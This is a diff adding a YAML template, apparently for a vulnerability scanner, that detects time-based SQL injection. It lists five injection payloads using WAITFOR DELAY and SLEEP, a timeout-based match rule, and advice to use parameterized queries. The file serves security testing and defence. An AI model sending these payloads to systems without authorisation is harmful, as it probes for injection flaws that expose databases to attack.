@@ -1,0 +1,19 @@
+id: sqli-time-001
+category: sqli
+technique: time_based
+severity: high
+payloads:
+  - "'; WAITFOR DELAY '0:0:5'--"
+  - "1; WAITFOR DELAY '0:0:5'--"
+  - "' OR SLEEP(5)--"
+  - "1 OR SLEEP(5)"
+  - "'; SELECT SLEEP(5)--"
+match:
+  type: regex
+  patterns:
+    - "NEVER_MATCHES_PATTERN_TIME_BASED_USES_TIMEOUT"
+  flags: ""
+remediation: >
+  Time-based SQLi is confirmed when the server response is delayed matching
+  the injected sleep duration. Use parameterized queries to prevent this.
+  Monitor your DB for unexpectedly long queries.
